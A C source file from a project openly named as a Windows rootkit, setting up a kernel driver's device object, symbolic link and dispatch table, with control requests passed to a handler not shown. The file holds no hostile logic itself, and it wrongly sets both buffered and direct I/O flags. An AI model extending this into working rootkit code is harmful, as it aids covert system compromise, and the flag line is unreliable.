/*==============================================================================
 * rootkit/src/device.c
 *------------------------------------------------------------------------------
 * Device Object Creation + Dispatch Table Setup.
 *============================================================================*/
#include "utils.h"

extern NTSTATUS ioctl_dispatch(PDEVICE_OBJECT dev, PIRP irp);

/*==============================================================================
 * CREATE/CLOSE DISPATCH (Shared)
 *------------------------------------------------------------------------------
 * Simple success handler for IRP_MJ_CREATE, IRP_MJ_CLOSE, IRP_MJ_CLEANUP.
 *============================================================================*/
static NTSTATUS dispatch_create_close(PDEVICE_OBJECT dev, PIRP irp) {
    UNREFERENCED_PARAMETER(dev);
    irp->IoStatus.Status = STATUS_SUCCESS;
    irp->IoStatus.Information = 0;
    IoCompleteRequest(irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

/*==============================================================================
 * DEVICE CREATION
 *------------------------------------------------------------------------------
 * Creates the device object and symbolic link.
 *============================================================================*/
NTSTATUS device_create(PDRIVER_OBJECT drv, PDEVICE_OBJECT* out_dev) {
    UNICODE_STRING dev_name;
    RtlInitUnicodeString(&dev_name, DEVICE_NAME);

    PDEVICE_OBJECT dev = NULL;
    NTSTATUS s = IoCreateDevice(
        drv, 0, &dev_name, FILE_DEVICE_UNKNOWN,
        FILE_DEVICE_SECURE_OPEN, FALSE, &dev);
    if (!NT_SUCCESS(s)) return s;

    /* Buffered I/O for simplicity with METHOD_BUFFERED IOCTLs. */
    dev->Flags |= DO_BUFFERED_IO | DO_DIRECT_IO;
    dev->Characteristics = 0;

    UNICODE_STRING link_name;
    RtlInitUnicodeString(&link_name, SYMLINK_NAME);
    s = IoCreateSymbolicLink(&link_name, &dev_name);
    if (!NT_SUCCESS(s)) {
        IoDeleteDevice(dev);
        return s;
    }

    *out_dev = dev;
    return STATUS_SUCCESS;
}

/*==============================================================================
 * DEVICE DESTRUCTION
 *------------------------------------------------------------------------------
 * Deletes symbolic link and device object.
 *============================================================================*/
VOID device_destroy(PDEVICE_OBJECT dev) {
    if (!dev) return;
    UNICODE_STRING link_name;
    RtlInitUnicodeString(&link_name, SYMLINK_NAME);
    IoDeleteSymbolicLink(&link_name);
    IoDeleteDevice(dev);
}

/*==============================================================================
 * DISPATCH TABLE SETUP
 *------------------------------------------------------------------------------
 * Initializes all MajorFunction entries to the create/close handler,
 * then overrides specific ones.
 *============================================================================*/
VOID device_set_dispatch(PDRIVER_OBJECT drv) {
    for (ULONG i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++) {
        drv->MajorFunction[i] = dispatch_create_close;
    }
    drv->MajorFunction[IRP_MJ_CREATE]         = dispatch_create_close;
    drv->MajorFunction[IRP_MJ_CLOSE]          = dispatch_create_close;
    drv->MajorFunction[IRP_MJ_CLEANUP]        = dispatch_create_close;
    drv->MajorFunction[IRP_MJ_DEVICE_CONTROL] = ioctl_dispatch;
}